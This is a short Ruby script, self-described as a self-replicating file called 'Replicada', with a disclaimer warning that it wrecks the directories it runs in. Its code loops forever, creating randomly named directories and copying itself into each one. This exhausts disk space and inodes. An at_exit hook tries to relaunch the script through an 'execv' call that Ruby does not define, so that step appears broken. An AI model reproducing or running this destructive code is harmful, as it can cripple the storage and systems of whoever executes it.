=begin
<DISCLAIMER>
THIS CODE REPLICATES ITSELF AND WILL CREATE NEW DIRECTORIES
PLEASE MIND THAT THIS WOULD FUCK UP YOUR DIRECTORIES, INCLUDING FILES AND FOLDERS
***DO NOT RUN THIS FILE IN ANY IMPORTANT DIRECTORIES***

self-replicating ruby file - Replicada by archisha69
=end

require "fileutils"
require "securerandom"
    
at_exit do
    execv(ARGV[0], ARGV)
end

cwd = FileUtils.pwd()

count = 0

#while count < 200
while true
    name = SecureRandom.hex
    FileUtils.mkdir(name)
    FileUtils.cd(name)
    FileUtils.cp("../#{File.basename(__FILE__)}", FileUtils.pwd())
    FileUtils.cd(cwd)
    count += 1
end
